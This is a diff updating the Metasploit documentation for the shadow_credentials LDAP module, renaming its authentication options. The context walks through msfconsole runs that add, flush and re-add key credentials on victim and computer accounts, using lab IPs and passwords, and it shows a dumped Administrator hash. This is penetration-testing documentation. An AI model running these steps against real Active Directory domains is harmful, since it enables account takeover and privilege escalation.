@@ -65,7 +65,7 @@ PropagationFlags      : None
 ## Module usage
 1. `use auxiliary/admin/ldap/shadow_credentials`
 2. Set the `RHOST` value to a target domain controller
-3. Set the `USERNAME` and `PASSWORD` information to an account with the necessary privileges
+3. Set the `LDAPUsername` and `LDAPPassword` information to an account with the necessary privileges
 4. Set the `TARGET_USER` to the victim account
 5. Use the `ADD` action to add a credential entry to the victim account
 
@@ -109,13 +109,8 @@ Module options (auxiliary/admin/ldap/shadow_credentials):
 
    Name         Current Setting  Required  Description
    ----         ---------------  --------  -----------
-   DOMAIN                        no        The domain to authenticate to
-   PASSWORD                      no        The password to authenticate with
-   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT        389              yes       The target port
    SSL          false            no        Enable SSL on the LDAP connection
    TARGET_USER                   yes       The target to write to
-   USERNAME                      no        The username to authenticate with
 
 
    When ACTION is REMOVE:
@@ -123,6 +118,24 @@ Module options (auxiliary/admin/ldap/shadow_credentials):
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    DEVICE_ID                   no        The specific certificate ID to operate on
+
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+
+   Used when making a new connection via RHOSTS:
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   LDAPDomain                     no        The domain to authenticate to
+   LDAPPassword                   no        The password to authenticate with
+   LDAPUsername                   no        The username to authenticate with
+   RHOSTS                         no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         389              no        The target port
 
 
 Auxiliary action:
@@ -137,12 +150,12 @@ View the full module info with the info, or info -d command.
 
 msf6 auxiliary(admin/ldap/shadow_credentials) > set rhosts 20.92.148.129
 rhosts => 20.92.148.129
-msf6 auxiliary(admin/ldap/shadow_credentials) > set domain MSF.LOCAL
-domain => MSF.LOCAL
-msf6 auxiliary(admin/ldap/shadow_credentials) > set username sandy
-username => sandy
-msf6 auxiliary(admin/ldap/shadow_credentials) > set password Password1!
-password => Password1!
+msf6 auxiliary(admin/ldap/shadow_credentials) > set ldapdomain MSF.LOCAL
+ldapdomain => MSF.LOCAL
+msf6 auxiliary(admin/ldap/shadow_credentials) > set ldapusername sandy
+ldapusername => sandy
+msf6 auxiliary(admin/ldap/shadow_credentials) > set ldappassword Password1!
+ldappassword => Password1!
 msf6 auxiliary(admin/ldap/shadow_credentials) > set target_user victim
 target_user => victim
 msf6 auxiliary(admin/ldap/shadow_credentials) > set action add
@@ -205,7 +218,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:26f8220ed7f1494c5737bd552e661
 In the following example the user `MSF\DESKTOP-H4VEQQHQ$` targets itself. No special permissions are required for this, as computers have some ability to modify their own value by default.
 
 ```msf
-msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 username=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ password=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
+msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ password=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
 [*] Running module against 20.92.148.129
 
 [+] Successfully bound to the LDAP server!
@@ -220,7 +233,7 @@ msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 username
 Note, however, that attempting to add a second credential will fail under these circumstances:
 
 ```msf
-msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 username=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ password=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
+msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
 [*] Running module against 20.92.148.129
 
 [+] Successfully bound to the LDAP server!
@@ -240,7 +253,7 @@ for any legitimate user relying on the existing value.
 ```msf
 msf6 auxiliary(admin/ldap/shadow_credentials) > set action flush
 action => flush
-msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 username=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ password=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
+msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
 [*] Running module against 20.92.148.129
 
 [+] Successfully bound to the LDAP server!
@@ -251,7 +264,7 @@ msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 username
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/ldap/shadow_credentials) > set action add
 action => add
-msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 username=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ password=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
+msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
 [*] Running module against 20.92.148.129
 
 [+] Successfully bound to the LDAP server!
